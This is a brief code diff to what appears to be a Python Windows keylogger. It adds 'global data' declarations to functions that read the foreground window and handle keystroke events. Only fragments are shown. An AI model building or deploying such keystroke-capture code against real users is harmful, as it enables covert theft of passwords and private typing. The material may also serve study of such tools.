@@ -12,7 +12,7 @@ data = ""
 
 
 def get_current_process():
-    
+    global data
     # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
     
@@ -43,7 +43,7 @@ def get_current_process():
     kernel32.CloseHandle(h_process)
     
 def KeyStroke(event):
-    
+    global data
     global current_window
     
     # check to see if target changed windows
